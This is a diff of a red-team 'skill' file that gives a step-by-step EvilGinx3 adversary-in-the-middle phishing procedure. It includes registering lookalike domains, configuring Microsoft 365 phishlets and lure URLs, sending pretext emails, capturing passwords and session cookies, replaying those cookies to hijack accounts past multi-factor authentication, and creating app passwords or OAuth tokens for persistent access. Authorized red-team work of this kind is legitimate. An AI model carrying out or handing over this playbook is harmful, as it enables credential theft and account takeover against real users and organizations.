@@ -1,8 +1,8 @@
 ---
 name: performing-initial-access-with-evilginx3
 description: Perform authorized initial access using EvilGinx3 adversary-in-the-middle
-  phishing framework to capture session tokens and bypass multi-factor authentication
-  during red team engagements.
+ phishing framework to capture session tokens and bypass multi-factor authentication
+ during red team engagements.
 domain: cybersecurity
 subdomain: red-teaming
 tags:
@@ -33,40 +33,40 @@ mitre_attack:
 - T1078
 - T1003
 mitre_f3:
-  version: '1.1'
-  tactics:
-  - resource-development
-  - initial-access
-  - positioning
-  techniques:
-  - id: T1583.001
-    name: 'Acquire Infrastructure: Domains'
-    tactic: resource-development
-    source: attack
-  - id: T1660
-    name: Phishing
-    tactic: initial-access
-    source: attack
-  - id: T1557
-    name: Adversary-in-the-Middle
-    tactic: initial-access
-    source: attack
-  - id: T1539
-    name: Steal Web Session Cookie
-    tactic: positioning
-    source: attack
-  - id: T1111
-    name: Multi-Factor Authentication Interception
-    tactic: initial-access
-    source: attack
-  - id: F1004
-    name: Access with Stolen Session Cookie
-    tactic: initial-access
-    source: f3
-  - id: F1006
-    name: Account Takeover
-    tactic: initial-access
-    source: f3
+ version: '1.1'
+ tactics:
+ - resource-development
+ - initial-access
+ - positioning
+ techniques:
+ - id: T1583.001
+ name: 'Acquire Infrastructure: Domains'
+ tactic: resource-development
+ source: attack
+ - id: T1660
+ name: Phishing
+ tactic: initial-access
+ source: attack
+ - id: T1557
+ name: Adversary-in-the-Middle
+ tactic: initial-access
+ source: attack
+ - id: T1539
+ name: Steal Web Session Cookie
+ tactic: positioning
+ source: attack
+ - id: T1111
+ name: Multi-Factor Authentication Interception
+ tactic: initial-access
+ source: attack
+ - id: F1004
+ name: Access with Stolen Session Cookie
+ tactic: initial-access
+ source: f3
+ - id: F1006
+ name: Account Takeover
+ tactic: initial-access
+ source: f3
 ---
 # Performing Initial Access with EvilGinx3
 
@@ -113,66 +113,66 @@ EvilGinx3 is a man-in-the-middle attack framework used for phishing login creden
 1. Register a convincing lookalike domain (e.g., using homoglyphs or typosquatting)
 2. Provision a VPS and point the domain's DNS A record to the server IP
 3. Install EvilGinx3:
-   ```bash
-   git clone https://github.com/kgretzky/evilginx2.git
-   cd evilginx2
-   make
-   sudo ./bin/evilginx -p ./phishlets
-   ```
+ ```bash
+ git clone https://github.com/kgretzky/evilginx2.git
+ cd evilginx2
+ make
+ sudo ./bin/evilginx -p ./phishlets
+ ```
 4. Configure the domain and IP in EvilGinx3:
-   ```
-   config domain example-phish.com
-   config ipv4 <server-ip>
-   ```
+ ```
+ config domain example-phish.com
+ config ipv4 <server-ip>
+ ```
 5. EvilGinx3 automatically provisions Let's Encrypt certificates for configured hostnames
 
 ### Phase 2: Phishlet Configuration
 1. Select or create a phishlet for the target service (e.g., Microsoft 365, Google Workspace):
-   ```
-   phishlets hostname o365 login.example-phish.com
-   phishlets enable o365
-   ```
+ ```
+ phishlets hostname o365 login.example-phish.com
+ phishlets enable o365
+ ```
 2. Verify phishlet is active and SSL certificate is issued:
-   ```
-   phishlets
-   ```
+ ```
+ phishlets
+ ```
 3. Create a lure URL for the phishing campaign:
-   ```
-   lures create o365
-   lures get-url 0
-   ```
+ ```
+ lures create o365
+ lures get-url 0
+ ```
 4. Optionally configure a redirect URL for post-capture:
-   ```
-   lures edit 0 redirect_url https://legitimate-site.com
-   ```
+ ```
+ lures edit 0 redirect_url https://legitimate-site.com
+ ```
 
 ### Phase 3: Phishing Delivery
 1. Craft a pretext email with the lure URL embedded
 2. Use GoPhish or manual SMTP for email delivery:
-   ```
-   # Integration with EvilGoPhish for combined campaigns
-   # Provides GoPhish email tracking + EvilGinx3 credential capture
-   ```
+ ```
+ # Integration with EvilGoPhish for combined campaigns
+ # Provides GoPhish email tracking + EvilGinx3 credential capture
+ ```
 3. Implement URL masking or shortening if needed for link obfuscation
 4. Deploy landing page with appropriate social engineering pretext
 
 ### Phase 4: Session Hijacking
 1. Monitor EvilGinx3 for captured sessions:
-   ```
-   sessions
-   sessions <session-id>
-   ```
+ ```
+ sessions
+ sessions <session-id>
+ ```
 2. Extract captured session cookies from the session:
-   ```
-   # Session output includes:
-   # - Username and password
-   # - Session cookies (authentication tokens)
-   # - Custom captured parameters
-   ```
+ ```
+ # Session output includes:
+ # - Username and password
+ # - Session cookies (authentication tokens)
+ # - Custom captured parameters
+ ```
 3. Import session cookies into a browser using a cookie editor extension:
-   - Export cookies in JSON format
-   - Use Cookie-Editor or EditThisCookie browser extension
-   - Navigate to the target service to validate session hijack
+ - Export cookies in JSON format
+ - Use Cookie-Editor or EditThisCookie browser extension
+ - Navigate to the target service to validate session hijack
 4. Establish persistent access by creating application passwords or OAuth tokens
 
 ### Phase 5: Post-Access Activities
